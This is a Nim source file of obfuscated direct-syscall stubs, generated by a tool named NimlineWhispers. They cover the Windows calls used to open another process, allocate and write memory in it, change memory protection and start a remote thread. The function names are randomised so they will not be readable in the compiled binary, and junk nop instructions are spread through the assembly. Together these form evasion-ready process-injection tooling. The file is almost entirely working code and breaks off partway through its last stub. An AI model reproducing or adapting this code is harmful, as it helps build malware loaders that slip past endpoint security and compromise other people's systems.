{.passC:"-masm=intel".}

# Contains direct syscalls
# Generated with NimlineWhispers by ajpc500
# Function names are renamed since they will be readable in the binary

# NtAllocateVirtualMemory -> nWEpirsdHAHLmkkz
# NtWriteVirtualMemory -> eodmammwgdehtZKC
# NtOpenProcess -> GALPYIdGzuLQOpTx
# NtCreateThreadEx -> MrvSSHuatQxosGly
# NtClose -> pCsHHYfYZhNuUXYy
# NtProtectVirtualMemory -> OWMMatfEEuAkFGyd

type
  PS_ATTR_UNION* {.pure, union.} = object
    Value*: ULONG
    ValuePtr*: PVOID
  PS_ATTRIBUTE* {.pure.} = object
    Attribute*: ULONG 
    Size*: SIZE_T
    u1*: PS_ATTR_UNION
    ReturnLength*: PSIZE_T
  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
  PS_ATTRIBUTE_LIST* {.pure.} = object
    TotalLength*: SIZE_T
    Attributes*: array[2, PS_ATTRIBUTE]
  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST

proc nWEpirsdHAHLmkkz*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
    asm """
	nop
	mov rax, gs:[0x60]                             
nWEpirsdHAHLmkkz_Check_X_X_XXXX:               
	nop
	cmp dword ptr [rax+0x118], 6
	je  nWEpirsdHAHLmkkz_Check_6_X_XXXX
	nop
	cmp dword ptr [rax+0x118], 10
	je  nWEpirsdHAHLmkkz_Check_10_0_XXXX
	nop
	jmp nWEpirsdHAHLmkkz_SystemCall_Unknown
nWEpirsdHAHLmkkz_Check_6_X_XXXX:               
	nop
	cmp dword ptr [rax+0x11c], 1
	je  nWEpirsdHAHLmkkz_Check_6_1_XXXX
    nop
	nop
	cmp dword ptr [rax+0x11c], 2
	je  nWEpirsdHAHLmkkz_SystemCall_6_2_XXXX
	nop
	cmp dword ptr [rax+0x11c], 3
	je  nWEpirsdHAHLmkkz_SystemCall_6_3_XXXX
	nop
	jmp nWEpirsdHAHLmkkz_SystemCall_Unknown
nWEpirsdHAHLmkkz_Check_6_1_XXXX:               
	nop
	cmp word ptr [rax+0x120], 7600
	je  nWEpirsdHAHLmkkz_SystemCall_6_1_7600
	nop
	cmp word ptr [rax+0x120], 7601
	je  nWEpirsdHAHLmkkz_SystemCall_6_1_7601
	nop
	jmp nWEpirsdHAHLmkkz_SystemCall_Unknown
nWEpirsdHAHLmkkz_Check_10_0_XXXX:              
	nop
	cmp word ptr [rax+0x120], 10240
	je  nWEpirsdHAHLmkkz_SystemCall_10_0_10240
	nop
	cmp word ptr [rax+0x120], 10586
	je  nWEpirsdHAHLmkkz_SystemCall_10_0_10586
	nop
	cmp word ptr [rax+0x120], 14393
	je  nWEpirsdHAHLmkkz_SystemCall_10_0_14393
    nop
	nop
	cmp word ptr [rax+0x120], 15063
	je  nWEpirsdHAHLmkkz_SystemCall_10_0_15063
	nop
	cmp word ptr [rax+0x120], 16299
	je  nWEpirsdHAHLmkkz_SystemCall_10_0_16299
	nop
	cmp word ptr [rax+0x120], 17134
	je  nWEpirsdHAHLmkkz_SystemCall_10_0_17134
	nop
	cmp word ptr [rax+0x120], 17763
	je  nWEpirsdHAHLmkkz_SystemCall_10_0_17763
	nop
	cmp word ptr [rax+0x120], 18362
	je  nWEpirsdHAHLmkkz_SystemCall_10_0_18362
	nop
	cmp word ptr [rax+0x120], 18363
	je  nWEpirsdHAHLmkkz_SystemCall_10_0_18363
    nop
	nop
	cmp word ptr [rax+0x120], 19041
	je  nWEpirsdHAHLmkkz_SystemCall_10_0_19041
	nop
	cmp word ptr [rax+0x120], 19042
	je  nWEpirsdHAHLmkkz_SystemCall_10_0_19042
	nop
	cmp word ptr [rax+0x120], 19043
	je  nWEpirsdHAHLmkkz_SystemCall_10_0_19043
    nop
	nop
	jmp nWEpirsdHAHLmkkz_SystemCall_Unknown
nWEpirsdHAHLmkkz_SystemCall_6_1_7600:          
	nop
	mov eax, 0x0015
	nop
	jmp nWEpirsdHAHLmkkz_Epilogue
nWEpirsdHAHLmkkz_SystemCall_6_1_7601:          
	nop
	mov eax, 0x0015
	nop
	jmp nWEpirsdHAHLmkkz_Epilogue
nWEpirsdHAHLmkkz_SystemCall_6_2_XXXX:          
	nop
	mov eax, 0x0016
	nop
	jmp nWEpirsdHAHLmkkz_Epilogue
    nop
nWEpirsdHAHLmkkz_SystemCall_6_3_XXXX:          
	nop
	mov eax, 0x0017
	nop
	jmp nWEpirsdHAHLmkkz_Epilogue
nWEpirsdHAHLmkkz_SystemCall_10_0_10240:        
	nop
	mov eax, 0x0018
	nop
	jmp nWEpirsdHAHLmkkz_Epilogue
nWEpirsdHAHLmkkz_SystemCall_10_0_10586:        
	nop
	mov eax, 0x0018
	nop
	jmp nWEpirsdHAHLmkkz_Epilogue
nWEpirsdHAHLmkkz_SystemCall_10_0_14393:        
	nop
	mov eax, 0x0018
	nop
	jmp nWEpirsdHAHLmkkz_Epilogue
nWEpirsdHAHLmkkz_SystemCall_10_0_15063:        
	nop
	mov eax, 0x0018
	nop
	jmp nWEpirsdHAHLmkkz_Epilogue
nWEpirsdHAHLmkkz_SystemCall_10_0_16299:        
	nop
	mov eax, 0x0018
	nop
	jmp nWEpirsdHAHLmkkz_Epilogue
nWEpirsdHAHLmkkz_SystemCall_10_0_17134:        
	nop
	mov eax, 0x0018
	nop
	jmp nWEpirsdHAHLmkkz_Epilogue
nWEpirsdHAHLmkkz_SystemCall_10_0_17763:        
	nop
	mov eax, 0x0018
    nop
	nop
	jmp nWEpirsdHAHLmkkz_Epilogue
nWEpirsdHAHLmkkz_SystemCall_10_0_18362:        
	nop
	mov eax, 0x0018
	nop
	jmp nWEpirsdHAHLmkkz_Epilogue
nWEpirsdHAHLmkkz_SystemCall_10_0_18363:        
	nop
	mov eax, 0x0018
	nop
	jmp nWEpirsdHAHLmkkz_Epilogue
nWEpirsdHAHLmkkz_SystemCall_10_0_19041:        
	nop
	mov eax, 0x0018
	nop
	jmp nWEpirsdHAHLmkkz_Epilogue
nWEpirsdHAHLmkkz_SystemCall_10_0_19042:        
	nop
	mov eax, 0x0018
	nop
	jmp nWEpirsdHAHLmkkz_Epilogue
nWEpirsdHAHLmkkz_SystemCall_10_0_19043:        
	nop
	mov eax, 0x0018
	nop
	jmp nWEpirsdHAHLmkkz_Epilogue
nWEpirsdHAHLmkkz_SystemCall_Unknown:           
	ret
nWEpirsdHAHLmkkz_Epilogue:
    nop
	nop
	mov r10, rcx
    nop
    nop
	syscall
    nop
	ret
    """

proc pCsHHYfYZhNuUXYy*(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
    asm """
	nop
	mov rax, gs:[0x60]             
pCsHHYfYZhNuUXYy_Check_X_X_XXXX:               
	nop
	cmp dword ptr [rax+0x118], 6
	je  pCsHHYfYZhNuUXYy_Check_6_X_XXXX
	nop
	cmp dword ptr [rax+0x118], 10
	je  pCsHHYfYZhNuUXYy_Check_10_0_XXXX
	nop
	jmp pCsHHYfYZhNuUXYy_SystemCall_Unknown
    nop
pCsHHYfYZhNuUXYy_Check_6_X_XXXX:               
	nop
	cmp dword ptr [rax+0x11c], 1
	je  pCsHHYfYZhNuUXYy_Check_6_1_XXXX
	nop
	cmp dword ptr [rax+0x11c], 2
	je  pCsHHYfYZhNuUXYy_SystemCall_6_2_XXXX
	nop
	cmp dword ptr [rax+0x11c], 3
    nop
	je  pCsHHYfYZhNuUXYy_SystemCall_6_3_XXXX
	nop
	jmp pCsHHYfYZhNuUXYy_SystemCall_Unknown
pCsHHYfYZhNuUXYy_Check_6_1_XXXX:               
	nop
	cmp word ptr [rax+0x120], 7600
	je  pCsHHYfYZhNuUXYy_SystemCall_6_1_7600
	nop
	cmp word ptr [rax+0x120], 7601
	je  pCsHHYfYZhNuUXYy_SystemCall_6_1_7601
	nop
	jmp pCsHHYfYZhNuUXYy_SystemCall_Unknown
pCsHHYfYZhNuUXYy_Check_10_0_XXXX:              
	nop
	cmp word ptr [rax+0x120], 10240
	je  pCsHHYfYZhNuUXYy_SystemCall_10_0_10240
	nop
	cmp word ptr [rax+0x120], 10586
	je  pCsHHYfYZhNuUXYy_SystemCall_10_0_10586
	nop
	cmp word ptr [rax+0x120], 14393
    nop
	je  pCsHHYfYZhNuUXYy_SystemCall_10_0_14393
	nop
	cmp word ptr [rax+0x120], 15063
	je  pCsHHYfYZhNuUXYy_SystemCall_10_0_15063
	nop
	cmp word ptr [rax+0x120], 16299
	je  pCsHHYfYZhNuUXYy_SystemCall_10_0_16299
	nop
	cmp word ptr [rax+0x120], 17134
	je  pCsHHYfYZhNuUXYy_SystemCall_10_0_17134
	nop
	cmp word ptr [rax+0x120], 17763
	je  pCsHHYfYZhNuUXYy_SystemCall_10_0_17763
	nop
	cmp word ptr [rax+0x120], 18362
	je  pCsHHYfYZhNuUXYy_SystemCall_10_0_18362
	nop
	cmp word ptr [rax+0x120], 18363
	je  pCsHHYfYZhNuUXYy_SystemCall_10_0_18363
	nop
	cmp word ptr [rax+0x120], 19041
    nop
	je  pCsHHYfYZhNuUXYy_SystemCall_10_0_19041
	nop
	cmp word ptr [rax+0x120], 19042
	je  pCsHHYfYZhNuUXYy_SystemCall_10_0_19042
	nop
	cmp word ptr [rax+0x120], 19043
	je  pCsHHYfYZhNuUXYy_SystemCall_10_0_19043
	nop
	jmp pCsHHYfYZhNuUXYy_SystemCall_Unknown
pCsHHYfYZhNuUXYy_SystemCall_6_1_7600:          
	nop
	mov eax, 0x000c
	nop
	jmp pCsHHYfYZhNuUXYy_Epilogue
pCsHHYfYZhNuUXYy_SystemCall_6_1_7601:          
	nop
	mov eax, 0x000c
	nop
	jmp pCsHHYfYZhNuUXYy_Epilogue
pCsHHYfYZhNuUXYy_SystemCall_6_2_XXXX:          
	nop
	mov eax, 0x000d
	nop
	jmp pCsHHYfYZhNuUXYy_Epilogue
pCsHHYfYZhNuUXYy_SystemCall_6_3_XXXX:          
	nop
	mov eax, 0x000e
    nop
	nop
	jmp pCsHHYfYZhNuUXYy_Epilogue
pCsHHYfYZhNuUXYy_SystemCall_10_0_10240:        
	nop
	mov eax, 0x000f
	nop
	jmp pCsHHYfYZhNuUXYy_Epilogue
pCsHHYfYZhNuUXYy_SystemCall_10_0_10586:        
	nop
	mov eax, 0x000f
	nop
	jmp pCsHHYfYZhNuUXYy_Epilogue
pCsHHYfYZhNuUXYy_SystemCall_10_0_14393:        
	nop
	mov eax, 0x000f
	nop
	jmp pCsHHYfYZhNuUXYy_Epilogue
pCsHHYfYZhNuUXYy_SystemCall_10_0_15063:        
	nop
	mov eax, 0x000f
	nop
	jmp pCsHHYfYZhNuUXYy_Epilogue
pCsHHYfYZhNuUXYy_SystemCall_10_0_16299:        
	nop
	mov eax, 0x000f
	nop
	jmp pCsHHYfYZhNuUXYy_Epilogue
pCsHHYfYZhNuUXYy_SystemCall_10_0_17134:        
	nop
	mov eax, 0x000f
	nop
	jmp pCsHHYfYZhNuUXYy_Epilogue
pCsHHYfYZhNuUXYy_SystemCall_10_0_17763:        
	nop
	mov eax, 0x000f
	nop
	jmp pCsHHYfYZhNuUXYy_Epilogue
pCsHHYfYZhNuUXYy_SystemCall_10_0_18362:        
	nop
	mov eax, 0x000f
	nop
	jmp pCsHHYfYZhNuUXYy_Epilogue
pCsHHYfYZhNuUXYy_SystemCall_10_0_18363:        
	nop
	mov eax, 0x000f
	nop
	jmp pCsHHYfYZhNuUXYy_Epilogue
pCsHHYfYZhNuUXYy_SystemCall_10_0_19041:        
	nop
	mov eax, 0x000f
	nop
	jmp pCsHHYfYZhNuUXYy_Epilogue
pCsHHYfYZhNuUXYy_SystemCall_10_0_19042:        
	nop
	mov eax, 0x000f
	nop
	jmp pCsHHYfYZhNuUXYy_Epilogue
pCsHHYfYZhNuUXYy_SystemCall_10_0_19043:        
	nop
	mov eax, 0x000f
	nop
	jmp pCsHHYfYZhNuUXYy_Epilogue
pCsHHYfYZhNuUXYy_SystemCall_Unknown:           
	ret
pCsHHYfYZhNuUXYy_Epilogue:
	nop
    mov r10, rcx
    nop
	syscall
    nop
    nop
	ret
    """

proc MrvSSHuatQxosGly*(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
    asm """
	nop
	mov rax, gs:[0x60]                      
MrvSSHuatQxosGly_Check_X_X_XXXX:               
	nop
	cmp dword ptr [rax+0x118], 6
	je  MrvSSHuatQxosGly_Check_6_X_XXXX
	nop
	cmp dword ptr [rax+0x118], 10
	je  MrvSSHuatQxosGly_Check_10_0_XXXX
    nop
	nop
	jmp MrvSSHuatQxosGly_SystemCall_Unknown
MrvSSHuatQxosGly_Check_6_X_XXXX:               
	nop
	cmp dword ptr [rax+0x11c], 1
	je  MrvSSHuatQxosGly_Check_6_1_XXXX
	nop
	cmp dword ptr [rax+0x11c], 2
    nop
	je  MrvSSHuatQxosGly_SystemCall_6_2_XXXX
    nop
	nop
	cmp dword ptr [rax+0x11c], 3
	je  MrvSSHuatQxosGly_SystemCall_6_3_XXXX
	nop
	jmp MrvSSHuatQxosGly_SystemCall_Unknown
MrvSSHuatQxosGly_Check_6_1_XXXX:               
	nop
	cmp word ptr [rax+0x120], 7600
	je  MrvSSHuatQxosGly_SystemCall_6_1_7600
	nop
	cmp word ptr [rax+0x120], 7601
    nop
	je  MrvSSHuatQxosGly_SystemCall_6_1_7601
	nop
	jmp MrvSSHuatQxosGly_SystemCall_Unknown
MrvSSHuatQxosGly_Check_10_0_XXXX:              
	nop
	cmp word ptr [rax+0x120], 10240
	je  MrvSSHuatQxosGly_SystemCall_10_0_10240
	nop
	cmp word ptr [rax+0x120], 10586
	je  MrvSSHuatQxosGly_SystemCall_10_0_10586
	nop
	cmp word ptr [rax+0x120], 14393
	je  MrvSSHuatQxosGly_SystemCall_10_0_14393
	nop
	cmp word ptr [rax+0x120], 15063
    nop
	je  MrvSSHuatQxosGly_SystemCall_10_0_15063
	nop
	cmp word ptr [rax+0x120], 16299
	je  MrvSSHuatQxosGly_SystemCall_10_0_16299
	nop
	cmp word ptr [rax+0x120], 17134
	je  MrvSSHuatQxosGly_SystemCall_10_0_17134
	nop
	cmp word ptr [rax+0x120], 17763
	je  MrvSSHuatQxosGly_SystemCall_10_0_17763
	nop
	cmp word ptr [rax+0x120], 18362
	je  MrvSSHuatQxosGly_SystemCall_10_0_18362
	nop
	cmp word ptr [rax+0x120], 18363
    nop
	je  MrvSSHuatQxosGly_SystemCall_10_0_18363
	nop
	cmp word ptr [rax+0x120], 19041
	je  MrvSSHuatQxosGly_SystemCall_10_0_19041
	nop
	cmp word ptr [rax+0x120], 19042
	je  MrvSSHuatQxosGly_SystemCall_10_0_19042
	nop
	cmp word ptr [rax+0x120], 19043
	je  MrvSSHuatQxosGly_SystemCall_10_0_19043
	nop
	jmp MrvSSHuatQxosGly_SystemCall_Unknown
MrvSSHuatQxosGly_SystemCall_6_1_7600:          
	nop
	mov eax, 0x00a5
	nop
	jmp MrvSSHuatQxosGly_Epilogue
MrvSSHuatQxosGly_SystemCall_6_1_7601:          
	nop
	mov eax, 0x00a5
	nop
	jmp MrvSSHuatQxosGly_Epilogue
MrvSSHuatQxosGly_SystemCall_6_2_XXXX:          
	nop
	mov eax, 0x00af
	nop
	jmp MrvSSHuatQxosGly_Epilogue
MrvSSHuatQxosGly_SystemCall_6_3_XXXX:          
	nop
	mov eax, 0x00b0
	nop
	jmp MrvSSHuatQxosGly_Epilogue
MrvSSHuatQxosGly_SystemCall_10_0_10240:        
	nop
	mov eax, 0x00b3
	nop
	jmp MrvSSHuatQxosGly_Epilogue
MrvSSHuatQxosGly_SystemCall_10_0_10586:        
	nop
	mov eax, 0x00b4
	nop
	jmp MrvSSHuatQxosGly_Epilogue
MrvSSHuatQxosGly_SystemCall_10_0_14393:        
	nop
	mov eax, 0x00b6
	nop
	jmp MrvSSHuatQxosGly_Epilogue
MrvSSHuatQxosGly_SystemCall_10_0_15063:        
	nop
	mov eax, 0x00b9
	nop
	jmp MrvSSHuatQxosGly_Epilogue
MrvSSHuatQxosGly_SystemCall_10_0_16299:        
	nop
	mov eax, 0x00ba
	nop
	jmp MrvSSHuatQxosGly_Epilogue
MrvSSHuatQxosGly_SystemCall_10_0_17134:        
	nop
	mov eax, 0x00bb
	nop
	jmp MrvSSHuatQxosGly_Epilogue
MrvSSHuatQxosGly_SystemCall_10_0_17763:        
	nop
	mov eax, 0x00bc
	nop
	jmp MrvSSHuatQxosGly_Epilogue
MrvSSHuatQxosGly_SystemCall_10_0_18362:        
	nop
	mov eax, 0x00bd
	nop
	jmp MrvSSHuatQxosGly_Epilogue
MrvSSHuatQxosGly_SystemCall_10_0_18363:        
	nop
	mov eax, 0x00bd
	nop
	jmp MrvSSHuatQxosGly_Epilogue
MrvSSHuatQxosGly_SystemCall_10_0_19041:        
	nop
	mov eax, 0x00c1
	nop
	jmp MrvSSHuatQxosGly_Epilogue
MrvSSHuatQxosGly_SystemCall_10_0_19042:        
	nop
	mov eax, 0x00c1
	nop
	jmp MrvSSHuatQxosGly_Epilogue
MrvSSHuatQxosGly_SystemCall_10_0_19043:        
	nop
	mov eax, 0x00c1
	nop
	jmp MrvSSHuatQxosGly_Epilogue
MrvSSHuatQxosGly_SystemCall_Unknown:           
	ret
MrvSSHuatQxosGly_Epilogue:
	nop
	mov r10, rcx
    nop
    nop
    nop
	syscall
    nop
    nop
	ret
    """

proc GALPYIdGzuLQOpTx*(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.asmNoStackFrame.} =
    asm """
	nop
	mov rax, gs:[0x60]                   
GALPYIdGzuLQOpTx_Check_X_X_XXXX:               
	nop
	cmp dword ptr [rax+0x118], 6
	je  GALPYIdGzuLQOpTx_Check_6_X_XXXX
	nop
	cmp dword ptr [rax+0x118], 10
    nop
	je  GALPYIdGzuLQOpTx_Check_10_0_XXXX
	nop
	jmp GALPYIdGzuLQOpTx_SystemCall_Unknown
GALPYIdGzuLQOpTx_Check_6_X_XXXX:               
	nop
	cmp dword ptr [rax+0x11c], 1
	je  GALPYIdGzuLQOpTx_Check_6_1_XXXX
	nop
	cmp dword ptr [rax+0x11c], 2
	je  GALPYIdGzuLQOpTx_SystemCall_6_2_XXXX
	nop
	cmp dword ptr [rax+0x11c], 3
    nop
	je  GALPYIdGzuLQOpTx_SystemCall_6_3_XXXX
	nop
	jmp GALPYIdGzuLQOpTx_SystemCall_Unknown
GALPYIdGzuLQOpTx_Check_6_1_XXXX:               
	nop
	cmp word ptr [rax+0x120], 7600
	je  GALPYIdGzuLQOpTx_SystemCall_6_1_7600
	nop
	cmp word ptr [rax+0x120], 7601
	je  GALPYIdGzuLQOpTx_SystemCall_6_1_7601
	nop
	jmp GALPYIdGzuLQOpTx_SystemCall_Unknown
GALPYIdGzuLQOpTx_Check_10_0_XXXX:              
	nop
	cmp word ptr [rax+0x120], 10240
	je  GALPYIdGzuLQOpTx_SystemCall_10_0_10240
	nop
	cmp word ptr [rax+0x120], 10586
    nop
	je  GALPYIdGzuLQOpTx_SystemCall_10_0_10586
	nop
	cmp word ptr [rax+0x120], 14393
	je  GALPYIdGzuLQOpTx_SystemCall_10_0_14393
	nop
	cmp word ptr [rax+0x120], 15063
	je  GALPYIdGzuLQOpTx_SystemCall_10_0_15063
	nop
	cmp word ptr [rax+0x120], 16299
	je  GALPYIdGzuLQOpTx_SystemCall_10_0_16299
	nop
	cmp word ptr [rax+0x120], 17134
	je  GALPYIdGzuLQOpTx_SystemCall_10_0_17134
	nop
	cmp word ptr [rax+0x120], 17763
	je  GALPYIdGzuLQOpTx_SystemCall_10_0_17763
	nop
	cmp word ptr [rax+0x120], 18362
	je  GALPYIdGzuLQOpTx_SystemCall_10_0_18362
	nop
	cmp word ptr [rax+0x120], 18363
	je  GALPYIdGzuLQOpTx_SystemCall_10_0_18363
	nop
	cmp word ptr [rax+0x120], 19041
    nop
	je  GALPYIdGzuLQOpTx_SystemCall_10_0_19041
	nop
	cmp word ptr [rax+0x120], 19042
	je  GALPYIdGzuLQOpTx_SystemCall_10_0_19042
	nop
	cmp word ptr [rax+0x120], 19043
	je  GALPYIdGzuLQOpTx_SystemCall_10_0_19043
	nop
	jmp GALPYIdGzuLQOpTx_SystemCall_Unknown
GALPYIdGzuLQOpTx_SystemCall_6_1_7600:          
	nop
	mov eax, 0x0023
	nop
	jmp GALPYIdGzuLQOpTx_Epilogue
GALPYIdGzuLQOpTx_SystemCall_6_1_7601:          
	nop
	mov eax, 0x0023
	nop
	jmp GALPYIdGzuLQOpTx_Epilogue
GALPYIdGzuLQOpTx_SystemCall_6_2_XXXX:          
	nop
	mov eax, 0x0024
	nop
	jmp GALPYIdGzuLQOpTx_Epilogue
GALPYIdGzuLQOpTx_SystemCall_6_3_XXXX:          
	nop
	mov eax, 0x0025
	nop
	jmp GALPYIdGzuLQOpTx_Epilogue
GALPYIdGzuLQOpTx_SystemCall_10_0_10240:        
	nop
	mov eax, 0x0026
	nop
	jmp GALPYIdGzuLQOpTx_Epilogue
GALPYIdGzuLQOpTx_SystemCall_10_0_10586:        
	nop
	mov eax, 0x0026
	nop
	jmp GALPYIdGzuLQOpTx_Epilogue
GALPYIdGzuLQOpTx_SystemCall_10_0_14393:        
	nop
	mov eax, 0x0026
	nop
	jmp GALPYIdGzuLQOpTx_Epilogue
GALPYIdGzuLQOpTx_SystemCall_10_0_15063:        
	nop
	mov eax, 0x0026
	nop
	jmp GALPYIdGzuLQOpTx_Epilogue
GALPYIdGzuLQOpTx_SystemCall_10_0_16299:        
	nop
	mov eax, 0x0026
	nop
	jmp GALPYIdGzuLQOpTx_Epilogue
GALPYIdGzuLQOpTx_SystemCall_10_0_17134:        
	nop
	mov eax, 0x0026
	nop
	jmp GALPYIdGzuLQOpTx_Epilogue
GALPYIdGzuLQOpTx_SystemCall_10_0_17763:        
	nop
	mov eax, 0x0026
	nop
	jmp GALPYIdGzuLQOpTx_Epilogue
GALPYIdGzuLQOpTx_SystemCall_10_0_18362:        
	nop
	mov eax, 0x0026
	nop
	jmp GALPYIdGzuLQOpTx_Epilogue
GALPYIdGzuLQOpTx_SystemCall_10_0_18363:        
	nop
	mov eax, 0x0026
	nop
	jmp GALPYIdGzuLQOpTx_Epilogue
GALPYIdGzuLQOpTx_SystemCall_10_0_19041:        
	nop
	mov eax, 0x0026
	nop
	jmp GALPYIdGzuLQOpTx_Epilogue
GALPYIdGzuLQOpTx_SystemCall_10_0_19042:        
	nop
	mov eax, 0x0026
	nop
	jmp GALPYIdGzuLQOpTx_Epilogue
GALPYIdGzuLQOpTx_SystemCall_10_0_19043:        
	nop
	mov eax, 0x0026
	nop
	jmp GALPYIdGzuLQOpTx_Epilogue
GALPYIdGzuLQOpTx_SystemCall_Unknown:
    nop 
	ret
GALPYIdGzuLQOpTx_Epilogue:
	nop
	mov r10, rcx
    nop
    nop
	syscall
    nop
    nop
	ret
    """

proc OWMMatfEEuAkFGyd*(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.asmNoStackFrame.} =
    asm """
	nop
	mov rax, gs:[0x60]                            
OWMMatfEEuAkFGyd_Check_X_X_XXXX:               
	nop
	cmp dword ptr [rax+0x118], 6
	je  OWMMatfEEuAkFGyd_Check_6_X_XXXX
	nop
	cmp dword ptr [rax+0x118], 10
    nop
	je  OWMMatfEEuAkFGyd_Check_10_0_XXXX
	nop
	jmp OWMMatfEEuAkFGyd_SystemCall_Unknown
OWMMatfEEuAkFGyd_Check_6_X_XXXX:               
	nop
	cmp dword ptr [rax+0x11c], 1
	je  OWMMatfEEuAkFGyd_Check_6_1_XXXX
	nop
	cmp dword ptr [rax+0x11c], 2
	je  OWMMatfEEuAkFGyd_SystemCall_6_2_XXXX
	nop
	cmp dword ptr [rax+0x11c], 3
	je  OWMMatfEEuAkFGyd_SystemCall_6_3_XXXX
	nop
	jmp OWMMatfEEuAkFGyd_SystemCall_Unknown
OWMMatfEEuAkFGyd_Check_6_1_XXXX:               
	nop
	cmp word ptr [rax+0x120], 7600
	je  OWMMatfEEuAkFGyd_SystemCall_6_1_7600
	nop
	cmp word ptr [rax+0x120], 7601
    nop
	je  OWMMatfEEuAkFGyd_SystemCall_6_1_7601
	nop
	jmp OWMMatfEEuAkFGyd_SystemCall_Unknown
OWMMatfEEuAkFGyd_Check_10_0_XXXX:              
	nop
	cmp word ptr [rax+0x120], 10240
	je  OWMMatfEEuAkFGyd_SystemCall_10_0_10240
	nop
	cmp word ptr [rax+0x120], 10586
	je  OWMMatfEEuAkFGyd_SystemCall_10_0_10586
	nop
	cmp word ptr [rax+0x120], 14393
	je  OWMMatfEEuAkFGyd_SystemCall_10_0_14393
	nop
	cmp word ptr [rax+0x120], 15063
	je  OWMMatfEEuAkFGyd_SystemCall_10_0_15063
	nop
	cmp word ptr [rax+0x120], 16299
	je  OWMMatfEEuAkFGyd_SystemCall_10_0_16299
	nop
	cmp word ptr [rax+0x120], 17134
	je  OWMMatfEEuAkFGyd_SystemCall_10_0_17134
    nop
	nop
	cmp word ptr [rax+0x120], 17763
	je  OWMMatfEEuAkFGyd_SystemCall_10_0_17763
	nop
	cmp word ptr [rax+0x120], 18362
	je  OWMMatfEEuAkFGyd_SystemCall_10_0_18362
	nop
	cmp word ptr [rax+0x120], 18363
	je  OWMMatfEEuAkFGyd_SystemCall_10_0_18363
	nop
	cmp word ptr [rax+0x120], 19041
	je  OWMMatfEEuAkFGyd_SystemCall_10_0_19041
	nop
	cmp word ptr [rax+0x120], 19042
	je  OWMMatfEEuAkFGyd_SystemCall_10_0_19042
	nop
	cmp word ptr [rax+0x120], 19043
	je  OWMMatfEEuAkFGyd_SystemCall_10_0_19043
	nop
	jmp OWMMatfEEuAkFGyd_SystemCall_Unknown
OWMMatfEEuAkFGyd_SystemCall_6_1_7600:          
	nop
	mov eax, 0x004d
	nop
	jmp OWMMatfEEuAkFGyd_Epilogue
OWMMatfEEuAkFGyd_SystemCall_6_1_7601:          
	nop
	mov eax, 0x004d
	nop
	jmp OWMMatfEEuAkFGyd_Epilogue
OWMMatfEEuAkFGyd_SystemCall_6_2_XXXX:          
	nop
	mov eax, 0x004e
	nop
	jmp OWMMatfEEuAkFGyd_Epilogue
OWMMatfEEuAkFGyd_SystemCall_6_3_XXXX:          
	nop
	mov eax, 0x004f
	nop
	jmp OWMMatfEEuAkFGyd_Epilogue
OWMMatfEEuAkFGyd_SystemCall_10_0_10240:        
	nop
	mov eax, 0x0050
	nop
	jmp OWMMatfEEuAkFGyd_Epilogue
OWMMatfEEuAkFGyd_SystemCall_10_0_10586:        
	nop
	mov eax, 0x0050
	nop
	jmp OWMMatfEEuAkFGyd_Epilogue
OWMMatfEEuAkFGyd_SystemCall_10_0_14393:        
	nop
	mov eax, 0x0050
	nop
	jmp OWMMatfEEuAkFGyd_Epilogue
OWMMatfEEuAkFGyd_SystemCall_10_0_15063:        
	nop
	mov eax, 0x0050
	nop
	jmp OWMMatfEEuAkFGyd_Epilogue
OWMMatfEEuAkFGyd_SystemCall_10_0_16299:        
	nop
	mov eax, 0x0050
	nop
	jmp OWMMatfEEuAkFGyd_Epilogue
OWMMatfEEuAkFGyd_SystemCall_10_0_17134:        
	nop
	mov eax, 0x0050
	nop
	jmp OWMMatfEEuAkFGyd_Epilogue
OWMMatfEEuAkFGyd_SystemCall_10_0_17763:        
	nop
	mov eax, 0x0050
	nop
	jmp OWMMatfEEuAkFGyd_Epilogue
OWMMatfEEuAkFGyd_SystemCall_10_0_18362:        
	nop
	mov eax, 0x0050
	nop
	jmp OWMMatfEEuAkFGyd_Epilogue
OWMMatfEEuAkFGyd_SystemCall_10_0_18363:        
	nop
	mov eax, 0x0050
	nop
	jmp OWMMatfEEuAkFGyd_Epilogue
OWMMatfEEuAkFGyd_SystemCall_10_0_19041:        
	nop
	mov eax, 0x0050
	nop
	jmp OWMMatfEEuAkFGyd_Epilogue
OWMMatfEEuAkFGyd_SystemCall_10_0_19042:        
	nop
	mov eax, 0x0050
	nop
	jmp OWMMatfEEuAkFGyd_Epilogue
OWMMatfEEuAkFGyd_SystemCall_10_0_19043:        
	nop
	mov eax, 0x0050
	nop
	jmp OWMMatfEEuAkFGyd_Epilogue
OWMMatfEEuAkFGyd_SystemCall_Unknown:           
	ret
OWMMatfEEuAkFGyd_Epilogue:
	nop
	mov r10, rcx
    nop
	syscall
    nop
	ret
    """

proc eodmammwgdehtZKC*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
    asm """
	nop
	mov rax, gs:[0x60]                          
eodmammwgdehtZKC_Check_X_X_XXXX:               
	nop
	cmp dword ptr [rax+0x118], 6
	je  eodmammwgdehtZKC_Check_6_X_XXXX
    nop
	nop
	cmp dword ptr [rax+0x118], 10
	je  eodmammwgdehtZKC_Check_10_0_XXXX
	nop
	jmp eodmammwgdehtZKC_SystemCall_Unknown
eodmammwgdehtZKC_Check_6_X_XXXX:               
	nop
	cmp dword ptr [rax+0x11c], 1
	je  eodmammwgdehtZKC_Check_6_1_XXXX
	nop
	cmp dword ptr [rax+0x11c], 2
